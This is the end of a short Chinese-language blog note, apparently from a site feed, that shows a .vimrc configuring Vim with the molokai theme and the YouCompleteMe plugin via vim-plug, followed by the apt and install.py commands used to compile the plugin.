<p>.vimrc: <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set nocompatible</span><br><span class="line">set rtp+=~/.vim/plugged/</span><br><span class="line">set number</span><br><span class="line">set t_Co=256</span><br><span class="line">syntax on</span><br><span class="line">set autoindent</span><br><span class="line">set smartindent</span><br><span class="line">set tabstop=4</span><br><span class="line">set shiftwidth=4</span><br><span class="line"></span><br><span class="line">"theme</span><br><span class="line">colorscheme molokai</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">"YouCompleteMe</span><br><span class="line">let g:ycm_global_ycm_extra_conf = '~/.ycm_extra_conf.py'</span><br><span class="line">let g:ycm_min_num_of_chars_for_completion=1</span><br><span class="line">let g:ycm_warning_symbol='&gt;*'</span><br><span class="line">let g:ycm_error_symbol='&gt;&gt;'</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">call plug#begin('~/.vim/plugged')</span><br><span class="line">Plug 'Valloric/YouCompleteMe'</span><br><span class="line">call plug#end()</span><br></pre></td></tr></table></figure> YouCompleteMe clone到vim里面后，还需要进去编译一下，执行 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install build-essential cmake python3-dev</span><br><span class="line">cd ~/.vim/plugged/YouCompleteMe</span><br><span class="line">python3 install.py --clang-completer</span><br></pre></td></tr></table></figure> 到此为止就差不多够用了</p>
]]></content>
      <tags>
        <tag>笔记</tag>
        <tag>kali</tag>
      </tags>
  </entry>
</search>
